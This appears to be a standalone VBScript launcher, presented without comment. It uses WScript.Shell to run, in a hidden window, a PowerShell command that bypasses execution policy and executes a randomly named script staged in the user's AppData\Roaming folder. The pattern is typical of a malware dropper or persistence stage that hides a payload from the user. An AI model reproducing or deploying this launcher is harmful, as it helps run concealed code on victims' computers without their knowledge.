command = "powershell.exe -nologo -noninteractive -command -ExecutionPolicy Bypass ""& $env:USERPROFILE/AppData/Roaming/tempFolder/Invoke-loowodi.ps1"""
set shell = CreateObject("WScript.Shell")
shell.Run command,0,false
